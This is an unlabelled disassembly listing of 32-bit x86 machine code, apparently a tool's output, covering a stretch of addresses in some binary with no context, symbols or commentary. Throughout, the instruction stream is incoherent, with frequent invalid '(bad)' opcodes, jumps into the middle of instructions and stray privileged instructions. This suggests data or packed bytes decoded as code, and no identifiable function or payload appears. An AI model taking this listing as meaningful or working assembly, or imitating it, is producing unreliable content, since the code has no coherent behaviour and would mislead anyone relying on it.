  42934e:	pop    ebx
  42934f:	mov    ebx,0x9c3a37
  429354:	je     0x429381
  429356:	xor    edi,DWORD PTR [ebx+0x668a33]
  42935c:	mov    WORD PTR [ebx],?
  42935e:	xor    BYTE PTR [ebx+0x8b4f64],bh
  429364:	pop    edi
  429365:	cmp    ecx,ecx
  429367:	jne    0x4293be
  429369:	mov    ebp,esp
  42936b:	cld    
  42936c:	push   esi
  42936d:	pop    ebx
  42936e:	inc    ebp
  42936f:	stc    
  429370:	aaa    
  429371:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  429378:	clc    
  429379:	test   dl,dl
  42937b:	xor    bh,bh
  42937d:	fs pop si
  429380:	or     bl,al
  429382:	cld    
  429383:	mov    eax,DWORD PTR [eax]
  429385:	push   ecx
  429386:	push   di
  429388:	retf   0x3645
  42938b:	aaa    
  42938c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429393:	clc    
  429394:	add    BYTE PTR [ebx+0x66],bl
  429397:	dec    edx
  429399:	mov    edx,DWORD PTR [edi-0x76]
  42939c:	push   edi
  42939d:	add    al,0xb7
  42939f:	xor    al,0xba
  4293a1:	cmp    al,0x8d
  4293a3:	je     0x4293a4
  4293a5:	mov    edx,DWORD PTR [eax-0x46]
  4293a8:	push   ecx
  4293a9:	lea    edi,[ebx+0x504fff]
  4293af:	push   ecx
  4293b0:	cmp    edx,DWORD PTR [ebx+0x75]
  4293b3:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  4293b9:	add    BYTE PTR [ebx],dh
  4293bb:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4293c1:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  4293c8:	mov    ebx,0x3b3a00
  4293cd:	jne    0x4293fa
  4293cf:	mov    DWORD PTR [ebx+0x728afc],edi
  4293d5:	xor    esi,DWORD PTR [ebx]
  4293d7:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  4293dd:	push   edi
  4293de:	cmp    esp,ebp
  4293e0:	jne    0x4293e2
  4293e2:	sbb    DWORD PTR [eax],0x8085c3fc
  4293e8:	clc    
  4293e9:	inc    ebx
  4293ea:	pop    ebx
  4293eb:	sti    
  4293ec:	add    eax,0xeb8bc075
  4293f1:	cld    
  4293f2:	xor    edi,DWORD PTR ds:0xf8c3855e
  4293f8:	mov    ecx,DWORD PTR [ecx+edx*2]
  4293fb:	rol    DWORD PTR [ebp-0x37],0xf
  4293ff:	mov    DWORD PTR [eax],ecx
  429401:	inc    edi
  429402:	(bad)  
  429403:	in     eax,0x4
  429405:	add    bh,bh
  429407:	(bad)  
  429408:	mov    esi,0xc38a5e
  42940d:	mov    esi,DWORD PTR [ebx]
  42940f:	push   ecx
  429410:	mov    edi,0xfc4fc7
  429415:	test   DWORD PTR [ebp-0x8],edx
  429418:	data16 cmp bh,al
  42941b:	pushf  
  42941c:	sub    ebp,eax
  42941e:	inc    ebp
  42941f:	(bad)  
  429420:	sub    edi,edi
  429422:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  429428:	inc    ebp
  429429:	add    BYTE PTR [esi+0x2b],ah
  42942c:	or     bh,BYTE PTR [edx+0xf8ac2]
  429432:	cmp    al,0x33
  429434:	mov    edi,DWORD PTR [edx+0x44f81]
  42943a:	(bad)  
  42943b:	cmp    esi,DWORD PTR [ebx]
  42943d:	je     0x4293f7
  42943f:	push   ebx
  429440:	dec    edi
  429441:	str    ecx
  429444:	cmp    ebp,DWORD PTR [eax+0x75]
  429447:	int    0x33
  429449:	mov    edi,0x789085f
  42944e:	mov    eax,DWORD PTR [esp+edi*8]
  429451:	add    cl,cl
  429453:	data16 add al,0xcb
  429456:	push   ebp
  429457:	add    ebp,esp
  429459:	jne    0x429447
  42945b:	(bad)  
  42945c:	mov    DWORD PTR [ecx],0xd685f7ec
  429462:	clc    
  429463:	xlat   BYTE PTR ds:[ebx]
  429464:	inc    ebp
  429465:	mov    edi,DWORD PTR [ecx]
  429467:	push   eax
  429468:	pushf  
  429469:	in     eax,0x8b
  42946b:	add    ah,ch
  42946d:	cld    
  42946e:	push   eax
  42946f:	add    BYTE PTR [ecx+0x66],dl
  429472:	add    eax,0x3672cb
  429477:	add    BYTE PTR [ebp+0x66],al
  42947a:	(bad)  
  42947b:	retf   
  42947c:	lock xor al,BYTE PTR [ebp+0x4566f800]
  429483:	retf   
  429484:	cmp    al,0xc8
  429486:	pushf  
  429487:	jge    0x429450
  429489:	aaa    
  42948a:	cld    
  42948b:	pushf  
  42948c:	test   DWORD PTR [edi-0x8],ebx
  42948f:	je     0x4294d6
  429491:	xor    esi,DWORD PTR ds:0x7020840
  429497:	ror    BYTE PTR [ebp-0x37],0x8d
  42949b:	push   ebp
  42949c:	add    esp,ebp
  42949e:	jb     0x42942b
  4294a0:	add    BYTE PTR [eax],cl
  4294a2:	dec    ebp
  4294a3:	mov    bh,0x81
  4294a5:	push   esi
  4294a6:	push   eax
  4294a7:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  4294ae:	xor    al,BYTE PTR [eax]
  4294b0:	mov    edx,DWORD PTR [edi+0x10]
  4294b3:	(bad)  
  4294b4:	scas   eax,DWORD PTR es:[edi]
  4294b5:	xor    bh,BYTE PTR [ebx]
  4294b7:	add    BYTE PTR [edi],cl
  4294b9:	mov    ebp,ebp
  4294bb:	cld    
  4294bc:	add    BYTE PTR [ebx],bh
  4294be:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4294c2:	dec    ebp
  4294c3:	or     BYTE PTR [ebx],ch
  4294c5:	ret    0x458b
  4294c8:	lock jmp 0x4294bc
  4294cb:	mov    ecx,DWORD PTR [eax]
  4294cd:	or     BYTE PTR [edi],al
  4294cf:	mov    ecx,eax
  4294d1:	xor    DWORD PTR [edx+0x2],0x0
  4294d5:	mov    bh,0xc1
  4294d7:	adc    BYTE PTR [eax],dh
  4294d9:	iret   
  4294da:	inc    ebp
  4294db:	mov    DWORD PTR [ebx],0x4dfff8c5
  4294e1:	inc    BYTE PTR [ebx]
  4294e3:	xor    bh,al
  4294e5:	add    BYTE PTR [ecx],dl
  4294e7:	data16 adc al,bh
  4294ea:	dec    ecx
  4294eb:	fisttp WORD PTR [ecx+0x456604c0]
  4294f1:	add    dh,BYTE PTR ds:0x75e0845
  4294f7:	ret    0x4d
  4294fa:	lea    ecx,[ebx+0x18728301]
  429500:	add    BYTE PTR [ebp+0x45],al
  429503:	cmp    cl,ch
  429505:	pushf  
  429506:	add    bh,al
  429508:	add    al,ch
  42950a:	inc    ebp
  42950b:	test   DWORD PTR [ebx-0x3eba0708],ecx
  429511:	xor    eax,0x781084d
  429516:	push   eax
  429517:	cwde   
  429518:	push   ecx
  429519:	xor    al,BYTE PTR [ecx+0x32f89889]
  42951f:	inc    ebp
  429520:	cmp    esp,DWORD PTR [eax]
  429522:	jbe    0x4294c0
  429524:	mov    eax,edi
  429526:	or     ah,dh
  429528:	inc    ebp
  429529:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  42952f:	cmp    cl,BYTE PTR [ebx-0x74747664]
  429535:	in     al,dx
  429536:	hlt    
  429537:	push   eax
  429538:	push   eax
  429539:	push   ecx
  42953a:	push   ecx
  42953b:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  429541:	cwde   
  429542:	cwde   
  429543:	xor    dh,BYTE PTR [edx]
  429545:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  42954b:	or     BYTE PTR [ebp+0x7],al
  42954e:	mov    eax,ecx
  429550:	clc    
  429551:	jb     0x429514
  429553:	add    BYTE PTR [ebp+0x55],cl
  429556:	or     DWORD PTR [edi],0xc251d150
  42955c:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  429566:	mov    edi,eax
  429568:	or     cl,al
  42956a:	inc    ebp
  42956b:	dec    ebp
  42956c:	mov    eax,DWORD PTR [ecx+0x514d500c]
  429572:	or     WORD PTR [ecx],0x8998
  429577:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  42957d:	mov    edx,DWORD PTR [ecx+0x8]
  429580:	mov    eax,DWORD PTR [ebp-0x8]
  429583:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  42958a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  429590:	inc    ebp
  429591:	dec    eax
  429592:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  429598:	add    edx,DWORD PTR [ecx-0x8]
  42959b:	mov    ecx,DWORD PTR [ecx]
  42959d:	clc    
  42959e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  4295a5:	mov    ecx,ebp
  4295a7:	clc    
  4295a8:	(bad)  
  4295a9:	popf   
  4295aa:	inc    DWORD PTR [eax]
  4295ac:	ret    0x8b
  4295af:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4295b5:	mov    edi,esp
  4295b7:	hlt    
  4295b8:	test   ecx,esi
  4295ba:	clc    
  4295bb:	or     BYTE PTR [ebp+0x7],al
  4295be:	cmp    ecx,eax
  4295c0:	pushf  
  4295c1:	jb     0x4295f6
  4295c3:	add    BYTE PTR [eax-0x3f],al
  4295c6:	inc    eax
  4295c7:	daa    
  4295c8:	inc    ebp
  4295c9:	inc    ebp
  4295ca:	xor    eax,0x7f80803
  4295cf:	dec    ebp
  4295d0:	cwde   
  4295d1:	add    esi,DWORD PTR [edx]
  4295d3:	clc    
  4295d4:	cmp    DWORD PTR [ecx],ecx
  4295d6:	or     al,0x8
  4295d8:	add    al,BYTE PTR [ebp+0x2c]
  4295db:	xor    eax,0x7350845
  4295e0:	or     BYTE PTR [ebp+0x7],cl
  4295e3:	lea    ebx,[eax-0x748dcdff]
  4295e9:	add    BYTE PTR [eax*2-0x74b21438],cl
  4295f0:	mov    edx,DWORD PTR [eax]
  4295f2:	cld    
  4295f3:	dec    ebp
  4295f4:	push   eax
  4295f5:	sub    edx,DWORD PTR [ecx-0x75]
  4295f8:	add    eax,0xf172fc
  4295fd:	or     BYTE PTR [ebp+0x7],cl
  429600:	add    eax,ecx
  429602:	or     al,0x72
  429604:	add    DWORD PTR [eax],eax
  429606:	mov    ebx,0x29c2c1
  42960b:	inc    ebp
  42960c:	mov    eax,DWORD PTR [ebx]
  42960e:	cmp    eax,0x3004d1c
  429614:	xbegin 0x66c8220e
  42961a:	clc    
  42961b:	or     BYTE PTR [ebp+0x45],al
  42961e:	cmp    DWORD PTR ds:0x78b089c,esi
  429624:	adc    BYTE PTR [ebp+0x45],cl
  429627:	lea    eax,[ebp+0x33727501]
  42962d:	add    cl,ch
  42962f:	inc    ebp
  429630:	add    bl,ch
  429632:	add    BYTE PTR [ebx+0x45850845],cl
  429638:	je     0x4295c5
  42963a:	push   ebx
  42963b:	or     al,0x85
  42963d:	dec    ebp
  42963e:	std    
  42963f:	mov    bh,bh
  429641:	mov    BYTE PTR [ebp-0x75],al
  429644:	mov    edi,eax
  429646:	or     al,0x89
  429648:	inc    ebp
  429649:	clc    
  42964a:	mov    esp,esp
  42964c:	hlt    
  42964d:	call   DWORD PTR [edi-0x37]
  429650:	push   eax
  429651:	or     al,0x51
  429653:	push   ebp
  429654:	xor    ebp,esp
  429656:	mov    esi,0x457251
  42965b:	cmp    dh,al
  42965d:	pushf  
  42965e:	inc    ebp
  42965f:	(bad)  
  429660:	mov    edi,eax
  429662:	or     al,0x85
  429664:	add    al,bh
  429666:	inc    eax
  429668:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  42966c:	or     ah,bh
  42966e:	inc    eax
  42966f:	push   eax
  429670:	jmp    0x4296c3
  429672:	mov    eax,DWORD PTR ds:0xe8720c
  429678:	mov    DWORD PTR [ebp-0x8],eax
  42967b:	jne    0x4296c2
  42967d:	jmp    0x42960a
  42967f:	mov    ebp,DWORD PTR [eax]
  429681:	clc    
  429682:	retf   0xff50
  429685:	push   ecx
  429686:	mov    DWORD PTR ds:0x757210,eax
  42968c:	mov    ecx,DWORD PTR [ebp-0x4]
  42968f:	sub    esp,DWORD PTR [ebx-0x77]
  429692:	dec    DWORD PTR [eax*4-0x74ca8abb]
  429699:	or     ah,bh
  42969b:	pop    es
  42969c:	ds cwde 
  42969e:	push   DWORD PTR [edx]
  4296a0:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4296a6:	(bad)  
  4296a7:	mov    bh,bh
  4296a9:	jmp    0x429697
  4296ab:	leave  
  4296ac:	jne    0x4296b6
  4296ae:	call   0x2f9008
  4296b3:	in     al,dx
  4296b4:	dec    ebp
  4296b5:	add    dh,BYTE PTR [ebx]
  4296b7:	add    BYTE PTR [ebx],al
  4296b9:	inc    ebp
  4296ba:	cmp    edi,DWORD PTR [eax]
  4296bc:	je     0x42965a
  4296be:	mov    eax,edi
  4296c0:	or     al,0xf0
  4296c2:	add    BYTE PTR [ebp+0x458bf845],al
  4296c8:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4296ce:	adc    al,0x7
  4296d0:	enter  0x9fc0,0xa5
  4296d4:	rol    BYTE PTR [eax],0x5e
  4296d7:	mov    ecx,ecx
  4296d9:	or     al,0xc
  4296db:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  4296e2:	jmp    0x4296e3
  4296e4:	push   ebp
  4296e5:	mov    esp,ebp
  4296e7:	cld    
  4296e8:	inc    ebp
  4296e9:	inc    ebp
  4296ea:	or     DWORD PTR [ecx+0x457dec10],0x0
  4296f1:	push   esi
  4296f2:	push   esi
  4296f3:	mov    edi,0x7af080f
  4296f8:	add    bh,al
  4296fa:	test   DWORD PTR [eax+0x3a7320f],ebx
  429700:	add    BYTE PTR [ecx+0x4540100f],cl
  429706:	mov    ebp,eax
  429708:	mov    ebp,edi
  42970a:	lock call edx
  42970d:	fcom   DWORD PTR [ebp+0x45]
  429710:	mov    eax,0x148a8b
  429715:	push   ecx
  429716:	enter  0xc145,0x83
  42971a:	cmp    cl,BYTE PTR [eax]
  42971c:	add    BYTE PTR [ebp+0x4d],al
  42971f:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  429725:	call   0xffa29294
  42972a:	cmp    eax,DWORD PTR [ebp-0xc]
  42972d:	jmp    DWORD PTR [eax+edx*1-0x4e]
  429731:	push   ebp
  429732:	(bad)
  429735:	std    
  429736:	lock push DWORD PTR [edi+0x5d08fcdb]
  42973d:	inc    ebp
  42973e:	(bad)  
  42973f:	call   0xff7c93cf
  429744:	add    al,BYTE PTR [ebp+0x37]
  429747:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  42974d:	jne    0x42974f
  42974f:	(bad)  
  429750:	cmp    edi,esp
  429752:	jne    0x429785
  429754:	mov    edi,edi
  429756:	or     BYTE PTR [ebx-0x307f0b49],cl
  42975c:	pop    ds
  42975d:	into   
  42975e:	je     0x429721
  429760:	mov    ebx,DWORD PTR [esi]
  429762:	or     BYTE PTR [ebp-0x49],al
  429765:	mov    esp,DWORD PTR [esi-0x77]
  429768:	mov    esi,0xfc451f0c
  42976d:	mov    eax,DWORD PTR [eax]
  42976f:	or     al,0x66
  429771:	sar    bl,0x3b
  429774:	xor    esi,DWORD PTR [ebp+0x66]
  429777:	xor    ecx,edi
  429779:	pop    edi
  42977a:	adc    bl,BYTE PTR [ebx+0x78]
  42977d:	ret    0xff
  429780:	cld    
  429781:	inc    ebp
  429782:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  429788:	cld    
  429789:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  429790:	push   0xffffff83
  429792:	pop    edi
  429793:	or     BYTE PTR [ebp+0x53],dh
  429796:	xorps  xmm1,xmm2
  429799:	test   BYTE PTR [eax+eax*1],bh
  42979c:	add    BYTE PTR [eax],al
  42979e:	adc    eax,eax
  4297a0:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  4297a8:	jmp    DWORD PTR [eax]
  4297aa:	ror    al,0x5e
  4297ad:	inc    ebp
  4297ae:	leave  
  4297af:	xor    ecx,DWORD PTR [eax]
  4297b1:	and    DWORD PTR [ebx-0x3ec90708],ecx
  4297b7:	add    ch,al
  4297b9:	xor    edi,edi
  4297bb:	xor    DWORD PTR [ebx],0x660033fc
  4297c1:	mov    DWORD PTR [ebp-0xc],ecx
  4297c4:	pcmpgtw mm0,mm0
  4297c7:	add    dl,ah
  4297c9:	leave  
  4297ca:	mov    edi,DWORD PTR [esi-0x7d]
  4297cd:	push   ax
  4297cf:	dec    ebp
  4297d0:	mov    esi,DWORD PTR [ebx-0x75]
  4297d3:	lea    ebp,[eax-0x7c00fffc]
  4297d9:	xor    eax,DWORD PTR [eax]
  4297db:	sysret 
  4297dd:	dec    ebp
  4297de:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  4297e5:	push   WORD PTR [ecx+0x8]
  4297e9:	jne    0x4297ac
  4297eb:	ud0    ecx,DWORD PTR [ecx]
  4297ee:	mov    esi,DWORD PTR [edx]
  4297f0:	lods   al,BYTE PTR ds:[esi]
  4297f1:	add    BYTE PTR [eax],al
  4297f3:	data16 (bad) 
  4297f5:	iret   
  4297f6:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  4297fd:	cli    
  4297fe:	inc    ebp
  4297ff:	cmp    al,0x8d
  429801:	add    BYTE PTR [esi+0x2d],ah
  429804:	inc    ebp
  429805:	pop    ebp
  429806:	lea    ecx,[edi]
  429808:	mov    dl,bh
  42980a:	add    BYTE PTR [edi],cl
  42980c:	mov    DWORD PTR [eax+eax*8],edi
  42980f:	mov    ebx,0x3a87
  429814:	add    BYTE PTR [ebx],ch
  429816:	inc    ebp
  429817:	data16 (bad) 
  429819:	clc    
  42981a:	int3   
  42981b:	cmp    eax,DWORD PTR [eax]
  42981d:	je     0x4297a8
  42981f:	push   0xffffffc8
  429821:	pop    edi
  429822:	xchg   DWORD PTR [ebp+0x0],eax
  429825:	data16 add BYTE PTR [ebp+0x45],cl
  429829:	lea    cx,[ebp+0x10]
  42982d:	jb     0x42982f
  42982f:	jmp    0x4297ba
  429831:	call   eax
  429833:	clc    
  429834:	xchg   DWORD PTR [edi+0x1],edi
  429837:	mov    eax,DWORD PTR [eax]
  429839:	or     BYTE PTR [ebp-0x49],al
  42983c:	lea    eax,[eax+0x74003154]
  429842:	push   edi
  429843:	inc    edx
  429844:	jge    0x429845
  429846:	mov    DWORD PTR [edi],ecx
  429848:	fdiv   DWORD PTR [edi-0x6]
  42984b:	inc    DWORD PTR [eax]
  42984d:	xor    edx,DWORD PTR [eax+0x5f]
  429850:	xchg   DWORD PTR [ebx+0x1],ebx
  429853:	ret    0x0
  429856:	xor    BYTE PTR [ebp-0x51],cl
  429859:	cmp    edi,0xf0ff8904
  42985f:	data16 ror al,0x84
  429863:	rol    BYTE PTR [eax],0x3b
  429866:	add    al,dh
  429868:	dec    eax
  429869:	xchg   esp,eax
  42986a:	push   ebx
  42986b:	jmp    0x4297f8
  42986d:	push   ebp
  42986e:	add    esp,ebp
  429870:	add    ebp,esp
  429872:	mov    edx,DWORD PTR [edi+0x24]
  429875:	clc    
  429876:	dec    esi
  429877:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  42987d:	cmp    BYTE PTR [ebx],al
  42987f:	jne    0x42980a
  429881:	xor    esp,eax
  429883:	jmp    0x459a06
  429888:	add    ebp,DWORD PTR [ecx+ecx*4]
  42988b:	jne    0x429881
  42988d:	call   0xffcc95e7
  429892:	clc    
  429893:	xchg   edi,eax
  429894:	sti    
  429895:	add    DWORD PTR [ebx],eax
  429897:	add    BYTE PTR [ebp+0x47],bl
  42989a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  4298a0:	pop    ebp
  4298a1:	mov    DWORD PTR [esi-0x48],esi
  4298a4:	jmp    0x4298ed
  4298a6:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  4298ac:	(bad)  
  4298ae:	cmp    al,0x0
  4298b0:	cmp    eax,DWORD PTR [ebp+0x18]
  4298b3:	lea    ebx,[ebp-0x56]
  4298b6:	jle    0x4298b8
  4298b8:	jae    0x429843
  4298ba:	mov    eax,esp
  4298bc:	call   0xb900:0x8b005587
  4298c3:	inc    ebp
  4298c4:	push   ebp
  4298c5:	lea    ecx,[ebp-0x27ff4f12]
  4298cb:	mov    eax,edi
  4298cd:	int3   
  4298ce:	push   ebp
  4298cf:	xchg   edi,eax
  4298d1:	add    esp,ebp
  4298d3:	add    BYTE PTR [eax],al
  4298d5:	inc    ebp
  4298d6:	add    BYTE PTR [ebp+0x8b3255],cl
  4298dc:	cld    
  4298dd:	mov    DWORD PTR [edx],edi
  4298df:	aam    0x75
  4298e1:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  4298e7:	mov    DWORD PTR [ebx-0x50],edx
  4298ea:	test   BYTE PTR [ebp-0x1],0xe8
  4298ee:	mov    eax,DWORD PTR [eax]
  4298f0:	hlt    
  4298f1:	add    al,al
  4298f3:	mov    eax,DWORD PTR ds:0x890045a8
  4298f9:	dec    DWORD PTR [ebx+0x45fdf0e8]
  4298ff:	inc    DWORD PTR [eax*2+0xf75854d]
  429906:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  42990c:	call   0x7298f64d
  429911:	je     0x429971
  429913:	js     0x429974
  429915:	lock ret 0x7e
  429919:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  42991f:	mov    edi,edi
  429921:	sbb    al,bl
  429923:	clc    
  429924:	add    BYTE PTR [ebp-0x73],bh
  429927:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  42992d:	ror    BYTE PTR [eax],1
  42992f:	dec    ebp
  429930:	xchg   ebp,eax
  429931:	mov    edi,edi
  429933:	in     al,0x8b
  429935:	jge    0x4298c0
  429937:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  42993d:	clc    
  42993e:	pop    esi
  42993f:	fist   DWORD PTR [ebp+0x5d398b5d]
  429945:	clc    
  429946:	add    al,0x6e
  429948:	mov    eax,DWORD PTR [ebx]
  42994a:	mov    BYTE PTR [ebp+0x0],dl
  42994d:	mov    edx,DWORD PTR [ebx-0x20]
  429950:	adc    esi,DWORD PTR [edi+0x5e005f36]
  429956:	add    eax,0x3b3a73
  42995b:	adc    al,0x89
  42995d:	pop    eax
  42995e:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  429962:	ret    0xf08
  429965:	cmp    al,0x2
  429967:	mov    DWORD PTR [edx],esi
  429969:	cld    
  42996a:	add    BYTE PTR [ebp+0x66],dl
  42996d:	add    eax,ebx
  42996f:	add    esp,eax
  429971:	sub    eax,eax
  429973:	or     BYTE PTR [ecx-0x77f474bb],cl
  429979:	add    BYTE PTR [eax],al
  42997b:	mov    DWORD PTR [ebx-0x24],ebx
  42997e:	push   edi
  42997f:	push   ebp
  429980:	clc    
  429981:	add    DWORD PTR [esi+0x1b0100],0x45
  429988:	out    0xff,eax
  42998a:	add    edx,DWORD PTR [eax]
  42998c:	jmp    0x429976
  42998e:	cmp    ch,0x43
  429991:	(bad)  
  429992:	jmp    0x40c821e4
  429997:	je     0x429923
  429999:	mov    eax,DWORD PTR [eax-0x10c78704]
  42999f:	inc    ebp
  4299a0:	add    BYTE PTR [ebx-0x770375],al
  4299a6:	add    ah,ch
  4299a8:	add    edx,esp
  4299aa:	pop    edi
  4299ab:	pop    ebp
  4299ac:	push   ebp
  4299ad:	inc    ebx
  4299ae:	in     al,dx
  4299af:	pop    ebp
  4299b0:	in     al,dx
  4299b1:	cmp    edx,DWORD PTR [edi-0x8]
  4299b4:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  4299bb:	add    al,0x47
  4299bd:	push   ebp
  4299be:	mov    esp,ebp
  4299c0:	in     al,0x45
  4299c2:	dec    ebp
  4299c3:	push   esi
  4299c4:	test   DWORD PTR [eax+0xff010f],esi
  4299ca:	add    BYTE PTR [eax+0xc018b],dh
  4299d0:	leave  
  4299d1:	inc    ebp
  4299d2:	test   al,ch
  4299d4:	add    dh,bh
  4299d6:	add    bh,bh
  4299d8:	dec    ebp
  4299d9:	push   cs
  4299da:	mov    DWORD PTR [ecx],eax
  4299dc:	hlt    
  4299dd:	push   es
  4299de:	dec    ebp
  4299df:	leave  
  4299e0:	mov    DWORD PTR [eax],ecx
  4299e2:	clc    
  4299e3:	cmovge eax,ecx
  4299e6:	mov    ecx,0x85c2f0
  4299ec:	clc    
  4299ed:	pop    DWORD PTR [ebp+0x1]
  4299f0:	aas    
  4299f1:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  4299f8:	push   esi
  4299f9:	add    BYTE PTR [ebp-0x4],al
  4299fc:	mov    DWORD PTR [eax],eax
  4299fe:	cld    
  4299ff:	inc    bp
  429a01:	add    DWORD PTR [edx],edi
  429a03:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  429a0b:	mov    ebx,0xcd4f68
  429a10:	mov    edi,DWORD PTR [ebx]
  429a12:	or     al,0x75
  429a14:	(bad)  
  429a15:	xor    ecx,ebx
  429a17:	enterw 0x4d01,0x87
  429a1c:	jmp    0x429a22
  429a21:	ret    
  429a22:	inc    ebp
  429a23:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  429a29:	add    dh,cl
  429a2b:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  429a33:	icebp  
  429a34:	or     BYTE PTR [eax+0x8f13bd2],al
  429a3a:	inc    ebp
  429a3b:	inc    edx
  429a3c:	mov    ecx,DWORD PTR [edx]
  429a3e:	or     al,0xf9
  429a40:	(bad)  
  429a41:	jne    0x429a11
  429a43:	mov    cl,0x0
  429a46:	rol    BYTE PTR [esi+0x450134],1
  429a4c:	add    eax,edi
  429a4e:	cld    
  429a4f:	ret    
  429a50:	dec    ebp
  429a51:	mov    ecx,DWORD PTR [edx+0x751c8583]
  429a57:	mov    edi,0xf82c8534
  429a5c:	jmp    0x429adb
  429a5e:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  429a64:	mov    dl,0x8b
  429a66:	sub    cl,BYTE PTR [eax]
  429a68:	mov    ecx,ecx
  429a6a:	in     al,dx
  429a6b:	test   cl,dh
  429a6d:	add    BYTE PTR [edx],al
  429a6f:	add    BYTE PTR [eax-0x377a97b3],al
  429a75:	cmovge esi,esp
  429a78:	add    eax,DWORD PTR [eax]
  429a7a:	cld    
  429a7b:	mov    eax,DWORD PTR [ecx]
  429a7d:	adc    BYTE PTR [ebp+0x4d],cl
  429a80:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  429a86:	xor    cl,BYTE PTR [ebx+0x4533082b]
  429a8c:	cmp    esp,ebx
  429a8e:	jne    0x429a2c
  429a90:	mov    eax,edi
  429a92:	adc    ah,ch
  429a94:	push   ebp
  429a95:	test   DWORD PTR [ebx],esi
  429a97:	clc    
  429a98:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  429a9e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  429aa1:	dec    ebp
  429aa2:	adc    bh,al
  429aa4:	push   0x8b85ff10
  429aa9:	clc    
  429aaa:	or     al,0x50
  429aac:	(bad)  
  429aad:	push   ecx
  429aae:	retf   
  429aaf:	mov    ebx,0xff4d8dc8
  429ab4:	mov    DWORD PTR [ebp+0x8],eax
  429ab7:	xor    eax,DWORD PTR [ebp-0x75]
  429aba:	cmp    ebp,DWORD PTR [ebx]
  429abc:	lsl    ebx,WORD PTR [edi-0x8]
  429ac0:	call   DWORD PTR [ebx-0x741bff75]
  429ac6:	(bad)  
  429ac7:	or     al,0x5b
  429ac9:	dec    ebp
  429aca:	or     BYTE PTR [ebx],dh
  429acc:	inc    ebp
  429acd:	xor    esi,DWORD PTR ds:0x708088d
  429ad3:	in     eax,0x98
  429ad5:	add    BYTE PTR [edx],dh
  429ad7:	inc    ebp
  429ad8:	pop    edi
  429ad9:	xor    eax,edx
  429adb:	test   DWORD PTR [eax],0x81108b8b
  429ae1:	dec    ebp
  429ae2:	sub    al,0x33
  429ae4:	add    BYTE PTR [ebx],dh
  429ae6:	push   esi
  429ae7:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  429aed:	mov    edi,eax
  429aef:	or     BYTE PTR [ebp+0x45],al
  429af2:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  429af8:	cmp    cl,cl
  429afa:	pushf  
  429afb:	push   es
  429afc:	mov    DWORD PTR [ebx-0x4],0xf817853b
  429b03:	dec    ebp
  429b04:	inc    ebp
  429b05:	and    BYTE PTR [eax],0x50
  429b08:	pushf  
  429b09:	push   0x4de4d1c7
  429b0e:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  429b14:	fsubr  st,st(1)
  429b16:	xlat   BYTE PTR ds:[ebx]
  429b17:	rol    bh,cl
  429b19:	mov    edx,esp
  429b1b:	or     BYTE PTR [ebp+0x4588f84d],al
  429b21:	mov    ecx,DWORD PTR [eax]
  429b23:	or     BYTE PTR [eax],al
  429b25:	push   ebp
  429b26:	mov    edi,DWORD PTR [eax+0xfc728b]
  429b2c:	dec    ebp
  429b2d:	enter  0xceba,0x8
  429b31:	retf   0x1807
  429b34:	ret    0x984d
  429b37:	mov    esi,DWORD PTR [edx]
  429b39:	or     al,0x33
  429b3b:	into   
  429b3c:	add    edx,esi
  429b3e:	add    ecx,edx
  429b40:	bswap  eax
  429b42:	ror    esi,0x98
  429b45:	dec    ebp
  429b46:	add    cl,ch
  429b48:	mov    edi,edi
  429b4a:	hlt    
  429b4b:	inc    esi
  429b4d:	inc    ebp
  429b4e:	ret    0x4533
  429b51:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  429b57:	or     BYTE PTR [ebx],dh
  429b59:	dec    ebp
  429b5a:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  429b60:	jne    0xff8c9b27
  429b66:	inc    ebp
  429b67:	inc    ebp
  429b68:	mov    esi,DWORD PTR [ebx]
